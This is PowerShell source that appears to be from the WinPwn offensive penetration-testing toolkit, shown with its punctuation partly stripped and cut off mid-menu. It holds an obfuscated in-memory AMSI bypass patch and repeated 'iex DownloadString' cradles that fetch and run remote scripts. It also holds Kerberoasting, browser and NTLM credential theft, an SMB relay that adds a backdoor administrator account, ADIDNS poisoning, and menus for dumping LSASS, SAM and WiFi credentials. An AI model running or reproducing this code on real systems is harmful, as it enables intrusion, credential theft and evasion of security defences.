#  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter.
[Net.ServicePointManager]SecurityProtocol = [Net.SecurityProtocolType]Ssl3 -bor [Net.SecurityProtocolType]Ssl2 -bor [Net.SecurityProtocolType]Tls -bor [Net.SecurityProtocolType]Tls11 -bor [Net.SecurityProtocolType]Tls12

function AmsiBypass
{
    #This is Rastamouses in memory patch method 
    $ztzsw = @
using System;
using System.Runtime.InteropServices;
public class ztzsw {
    [DllImport(kernel32)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(kernel32)]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(kernel32)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr msrelr, uint flNewProtect, out uint lpflOldProtect);
}
@

  Add-Type $ztzsw

  $kgqdegv = [ztzsw]LoadLibrary($([CHar](97)+[CHar](1095353)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](1003535)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c)))
  $dfwxos = [ztzsw]GetProcAddress($kgqdegv, $([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72)))
  $p = 0
  $qddw = 0xB8
  $fwyu = 0x80
  $bsyb = 0x57
  [ztzsw]VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
  $ymfa = 0x07
  $zcbf = 0x00
  $dned = 0xC3
  $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
  [System.Runtime.InteropServices.Marshal]Copy($msueg, 0, $dfwxos, 6)

}

function dependencychecks
{
    #
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy activenot active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =     Standalone Workstation     ;
                              1         =     Member Workstation         ;
                              2         =     Standalone Server          ;
                              3         =     Member Server              ;
                              4         =     Backup  Domain Controller  ;
                              5         =     Primary Domain Controller        
         }

        #Proxy Detect #1
        proxydetect
        pathcheck
        $PSVersion=$PSVersionTable.PSVersion.Major
        
        write-host [] Checking for Default PowerShell version ..`n -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  [!] You have PowerShell v1.0.`n
            
                Write-Warning  [!] This script only supports Powershell verion 2 or above.`n
                       
                exit  
        }
        
        write-host        [+] -----  PowerShell v$PSVersion`n ; sleep 1
        
        write-host [] Detecting system role ..`n -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if(($systemRoleID -ne 1) -or ($systemRoleID -ne 3) -or ($systemRoleID -ne 4) -or ($systemRoleID -ne 5)){
        
                       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n
                              
                   
        }
        
        write-host        [+] -----,$systemRoles[[int]$systemRoleID],`n ; sleep 1

                    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    write-host        [+] ----- Installed .NET Framework versions 

    Get-ChildItem 'HKLMSOFTWAREMicrosoftNET Framework SetupNDP' -Recurse 
  Get-ItemProperty -name Version, Release -EA 0 
  Where-Object { $_.PSChildName -match '^(!S)p{L}'} 
  Select-Object @{name = .NET Framework; expression = {$_.PSChildName}}, 
  @{name = Product; expression = {$Lookup[$_.Release]}},Version, Release

}

function pathCheck
{
  #
        .DESCRIPTION
        Checks for correct path dependencies.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Dependency Check
        $currentPath = (Get-Item -Path . -Verbose).FullName                
        Write-Host -ForegroundColor Yellow 'CreatingChecking Log Folders in '$currentPath' directory'
        
        if(!(Test-Path -Path $currentPathLocalRecon)){mkdir $currentPathLocalRecon}
        if(!(Test-Path -Path $currentPathDomainRecon)){mkdir $currentPathDomainRecon;mkdir $currentPathDomainReconADrecon}
        if(!(Test-Path -Path $currentPathLocalPrivEsc)){mkdir $currentPathLocalPrivEsc}
        if(!(Test-Path -Path $currentPathExploitation)){mkdir $currentPathExploitation}
        if(!(Test-Path -Path $currentPathVulnerabilities)){mkdir $currentPathVulnerabilities}
        if(!(Test-Path -Path $currentPathLocalPrivEsc)){mkdir $currentPathLocalPrivEsc}

}

function sharpcradle{
  #
      .DESCRIPTION
        Download .NET Binary to RAM.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
        Param
    (
        [switch]
        $allthosedotnet,
      [switch]
        $web,
        [string]
        $argument1,
        [string]
        $argument2,
        [string]
        $argument3,
        [Switch]
        $consoleoutput,
        [switch]
        $noninteractive
    )
    
    if(!$consoleoutput){pathcheck}
    BlockEtw
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if ($allthosedotnet)
    {
        @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- Automate some internal Penetrationtest processes
'@
        if ($noninteractive)
        {
            Write-Host -ForegroundColor Yellow 'Executing Seatbelt.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Seatbelt.ps1'); 
            if(!$consoleoutput){Invoke-Seatbelt -Command -group=all  $currentPathLocalPrivescSeatbelt.txt}else{Invoke-Seatbelt -Command -group=all}
            
            Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Rubeus.ps1')
            if(!$consoleoutput){
                Invoke-Rubeus -Command asreproast formathashcat nowrap outfile$currentPathExploitationASreproasting.txt 
                Invoke-Rubeus -Command kerberoast formathashcat nowrap outfile$currentPathExploitationKerberoasting_Rubeus.txt
                Get-Content $currentPathExploitationASreproasting.txt
                Get-Content $currentPathExploitationKerberoasting_Rubeus.txt
            }
            else
            {
                Invoke-Rubeus -Command asreproast formathashcat nowrap
                Invoke-Rubeus -Command kerberoast formathashcat nowrap
            }

            Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpWatson.ps1')
            if(!$consoleoutput){
                Invoke-watson  $currentPathVulnerabilitiesPrivilege_Escalation_Vulns.txt
                Get-Content $currentPathVulnerabilitiesPrivilege_Escalation_Vulns.txt
            }
            else
            {
                Invoke-watson
            }
            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Sharpweb.ps1')
            if(!$consoleoutput){
                Invoke-Sharpweb -command all  $currentPathExploitationBrowsercredentials.txt
            }
            else
            {
                Invoke-Sharpweb -command all
            }
            Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpUp.ps1')
            if (isadmin)
            {
                if(!$consoleoutput){Invoke-SharpUp -command audit  $currentPathVulnerabilitiesPrivilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command audit}
            }
            else
            {
                if(!$consoleoutput){Invoke-SharpUp -command    $currentPathVulnerabilitiesPrivilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command  }
            }

            if (isadmin)
            {
                Write-Host -ForegroundColor Yellow 'Running Internalmonologue.'
                iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Internalmonologue.ps1')
                if(!$consoleoutput){
                    Invoke-Internalmonologue -command -Downgrade true -impersonate true -restore true  $currentPathExploitationInternalmonologue.txt
                    Get-Content $currentPathExploitationInternalmonologue.txt
                }
                else
                {
                    Invoke-Internalmonologue -command -Downgrade true -impersonate true -restore true
                }
             }
             else
             {
                Write-Host -Foregroundcolor Yellow Run as admin.
             }
            
            return
        }
        
        do
        {
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. Seatbelt '
            Write-Host -ForegroundColor Green '2. Kerberoasting Using Rubeus! '
            Write-Host -ForegroundColor Green '3. Search for missing windows patches Using Watson! '
            Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
            Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
            Write-Host -ForegroundColor Green '6. Internal Monologue Attack Retrieving NTLM Hashes without Touching LSASS! '
            Write-Host -ForegroundColor Green '7. Go back. '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            

            Switch ($masterquestion) 
            {
                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Seatbelt.ps1'); Invoke-Seatbelt -Command -group=all -outputfile=$currentPathLocalPrivescSeatbelt.txt; pause}
                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .Exploitation';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Rubeus.ps1'); Invoke-Rubeus -Command asreproast formathashcat nowrap outfile$currentPathExploitationASreproasting.txt; Invoke-Rubeus -Command kerberoast formathashcat nowrap outfile$currentPathExploitationKerberoasting_Rubeus.txt}
                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .Vulnerabilities'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpWatson.ps1'); Invoke-watson  $currentPathVulnerabilitiesPrivilege_Escalation_Vulns.txt;  }
                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .Exploitation'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Sharpweb.ps1');Invoke-Sharpweb -command all  $currentPathExploitationBrowsercredentials.txt}
                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .Vulnerabilities';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpUp.ps1');if (isadmin){Invoke-SharpUp -command audit  $currentPathVulnerabilitiesPrivilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command    $currentPathVulnerabilitiesPrivilege_Escalation_Vulns_SharpUp.txt;} }
                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .Exploitation'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Internalmonologue.ps1');Invoke-Internalmonologue -command -Downgrade true -impersonate true -restore true  $currentPathExploitationSafetyCreds.txt}else{Write-Host -Foregroundcolor Yellow Run as admin.;pause}}
            }
        }
        While ($masterquestion -ne 7)
    	      
	    
    }
    if ($web)
    {
          iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Invoke-SharpcradlemasterInvoke-Sharpcradle.ps1')
            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example httpsgithub.comS3cur3Th1sSh1tCredsrawmasterpwned_x64notepad.exe'
          $arg = Read-Host -Prompt 'Do you need to set custom parameters  arguments for the executable'
          if ($arg -eq yes -or $arg -eq y -or $arg -eq Yes -or $arg -eq Y)
            {
                $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file'
                $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable'
              if ($arg1 -eq yes -or $arg1 -eq y -or $arg1 -eq Yes -or $arg1 -eq Y)
                {
                    $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file'
                    Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
                }
                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
             
            }

            	
    }
}

function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]Administrator)
    return $isAdmin
}

function Inveigh {
  #
      .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    pathcheck
    $currentip = Get-currentIP
    $currentPath = (Get-Item -Path . -Verbose).FullName
    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks (yesno)'
    
    if ($relayattacks -eq yes -or $relayattacks -eq y -or $relayattacks -eq Yes -or $relayattacks -eq Y)
    {
        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
        invoke-expression 'cmd c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repoWinPwnmasterWinPwn.ps1'');WinPwn -repo $S3cur3Th1sSh1t_repo;}'
        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group (varies for different countries)'
        $Wcl = new-object System.Net.WebClient
        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials

        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + CredsmasterobfuscatedpsInvoke-InveighRelay.ps1)
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + CredsmasterobfuscatedpsInvoke-SMBClient.ps1)
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + CredsmasterobfuscatedpsInvoke-SMBEnum.ps1)
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + CredsmasterobfuscatedpsInvoke-SMBExec.ps1)

        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command net user pwned 0WnedAccount! add; net localgroup $admingroup pwned add -Attack Enumerate,Execute,Session

        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further reconexploitation'
    }
    
    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack (yesno)'
    if ($adidns -eq yes -or $adidns -eq y -or $adidns -eq Yes -or $adidns -eq Y)
    {   
        if (isadmin)
        {
                cmd c start powershell -Command {$IPaddress = Get-NetIPConfiguration  Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne Disconnected};$currentPath = (Get-Item -Path . -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsamsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsInveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath;}
    }
        else 
        {
               cmd c start powershell -Command {$IPaddress = Get-NetIPConfiguration  Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne Disconnected};$currentPath = (Get-Item -Path . -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsamsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsInveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath;}
      }
    }
    else
    {
        if (isadmin)
        {
                cmd c start powershell -Command {$IPaddress = Get-NetIPConfiguration  Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne Disconnected};$currentPath = (Get-Item -Path . -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsamsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsInveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath;}
		
        }
        else 
        {
               cmd c start powershell -Command {$IPaddress = Get-NetIPConfiguration  Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne Disconnected};$currentPath = (Get-Item -Path . -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsamsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsInveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath;}
	       
        }
    }
}


function adidnsmenu
{

    pathcheck
    do
        {
       @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- ADIDNS menu @S3cur3Th1sSh1t
'@
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
          Write-Host -ForegroundColor Green '5. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{adidns -add}
                2{adidns -remove}
                3{adidns -addwildcard}
                4{adidns -removewildcard}
             }
        }
        While ($masterquestion -ne 5)
         
           
}



function adidns
{
         param(
        [switch]
        $addwildcard,
        [switch]
        $removewildcard,
        [switch]
        $add,
        [switch]
        $remove
  )
    pathcheck
    # Kevin-Robertsons Powermad for Node creation
    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + CredsmasterPowershellScriptsPowermad.ps1)
    if ($addwildcard)
    {
        $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record This can in the worst case cause network disruptions for all clients and servers for the next hours! (yesno)'
        if ($adidns -eq yes -or $adidns -eq y -or $adidns -eq Yes -or $adidns -eq Y)
        {
            $target = read-host Please enter the IP-Adress for the wildcard entry
          New-ADIDNSNode -Node  -Tombstone -Verbose -data $target
            Write-Host -ForegroundColor Red 'Be sure to remove the record with `Remove-ADIDNSNode -Node  -Verbose` at the end of your tests'
        }
    }
    if($removewildcard)
    {
        Remove-ADIDNSNode -Node 
    }
    if($add)
    {
       $target = read-host Please enter the IP-Adress for the ADIDNS entry
       $node = read-host Please enter the Node name
     New-ADIDNSNode -Node $node -Tombstone -Verbose -data $target
    }
    if($remove)
    {
       $node = read-host Please enter the Node name to be removed
     Remove-ADIDNSNode -Node $node
    }

           
}

function SessionGopher 
{
    #
      .DESCRIPTION
        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $allsystems
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpssegoph.ps1')
    $whole_domain = no
    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain (yesno) - takes a lot of time'}
    if ($whole_domain -eq yes -or $whole_domain -eq y -or $whole_domain -eq Yes -or $whole_domain -eq Y)
    {
            
          $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests (yesno) - takes a fuckin lot of time'
            if ($session -eq yes -or $session -eq y -or $session -eq Yes -or $session -eq Y)
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'LocalReconSessionGopher.txt'
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain  $currentPathLocalReconSessionGopher.txt}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'LocalReconSessionGopher.txt'
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain  $currentPathLocalReconSessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
            }
    }
    else
    {
        $session = no
      if(!$noninteractive)
        {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests (yesno) - takes a lot of time'
        }
            if ($session -eq yes -or $session -eq y -or $session -eq Yes -or $session -eq Y)
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'LocalReconSessionGopher.txt'
                Invoke-S3ssionGoph3r -Thorough  $currentPathLocalReconSessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'LocalReconSessionGopher.txt'
                Invoke-S3ssionGoph3r  $currentPathLocalReconSessionGopher.txt
            }
    }
    if ($noninteractive -and $consoleoutput)
    {
        if ($allsystems)
        {
            Invoke-S3ssionGoph3r -AllDomain
        }
        Invoke-S3ssionGoph3r -Thorough
    }
}


function Kittielocal 
{
    #
      .DESCRIPTION
        Dumps Credentials from Memory  Registry  SAM Database  Browsers  Files  DPAPI.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud,
        [Switch]
        $teamviewer
    )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    AmsiBypass
    if ($noninteractive)
    {
        if ($credentialmanager)
        {
            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsDumpWCM.ps1')
            Write-Host Dumping now, output goes to .ExploitationWCMCredentials.txt
            if(!$consoleoutput){Invoke-WCMDump  $currentPathExploitationWCMCredentials.txt}else{Invoke-WCMDump}
        }
        if($mimikittie)
        {
            if (isadmin){if(!$consoleoutput){obfuskittiedump -noninteractive}else{obfuskittiedump -noninteractive -consoleoutput}}
        }
        if($rundll32lsass)
        {
            if(isadmin){if(!$consoleoutput){dumplsass -noninteractive}else{dumplsass -noninteractive -consoleoutput}}
        }
        if($lazagne)
        {
            if(!$consoleoutput){lazagnemodule -noninteractive}else{lazagnemodule -noninteractive -consoleoutput}
        }
        if($browsercredentials)
        {
            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .Exploitation'
            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Sharpweb.ps1')
            if(!$consoleoutput){Invoke-Sharpweb -command all  $currentPathExploitationBrowsercredentials.txt}else{Invoke-Sharpweb -command all}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittenz -noninteractive}else{kittenz -noninteractive -consoleoutput}
        }
        if($wificredentials)
        {
            if(isadmin){if(!$consoleoutput){wificreds}else{wificreds -noninteractive -consoleoutput}}
        }
        if ($samdump)
        {
            if(isadmin){if(!$consoleoutput){samfile}else{samfile -noninteractive -consoleoutput}}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){SharpCloud}else{SharpCloud -noninteractive -consoleoutput}
        }
        if ($teamviewer)
        {
            if(!$consoleoutput){decryptteamviewer}else{decryptteamviewer -consoleoutput -noninteractive}
        } 
        return
    }
      
        do
        {
       @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- Get some credentials
'@
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
          Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
          Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
          Write-Host -ForegroundColor Green '12. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsDumpWCM.ps1');Write-Host Dumping now, output goes to .ExploitationWCMCredentials.txt; Invoke-WCMDump  $currentPathExploitationWCMCredentials.txt}
                2{if (isadmin){obfuskittiedump}}
                3{if(isadmin){safedump}}
                4{if(isadmin){dumplsass}}
                5{lazagnemodule}
                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .Exploitation';iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Sharpweb.ps1'); Invoke-Sharpweb -command all  $currentPathExploitationBrowsercredentials.txt}
            7{kittenz}
            8{if(isadmin){wificreds}}
            9{if(isadmin){samfile}}
      10{SharpCloud}
      11{decryptteamviewer}
             }
        }
        While ($masterquestion -ne 12)
}


function lsassdumps
{
        do
        {
       @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- Dump lsass for sweet creds
'@
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
            Write-Host -ForegroundColor Green '2. Use WerDump! '
            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{if(isadmin){HandleKatz}else{Write-Host -ForegroundColor Red You need to use an elevated process (lokal Admin)}}
                2{if(isadmin){werDump}else{Write-Host -ForegroundColor Red You need to use an elevated process (lokal Admin)}}
                3{if(isadmin){Dumplsass}else{Write-Host -ForegroundColor Red You need to use an elevated process (lokal Admin)}}
                4{if(isadmin){NanoDumpChoose}else{Write-Host -ForegroundColor Red You need to use an elevated process (lokal Admin)}}
             }
        }
        While ($masterquestion -ne 5)

}

function NanoDumpChoose
{
        do
        {
       @'
             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _
   -- NanoDump Submenu
'@
            Write-Host ================ WinPwn ================
            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
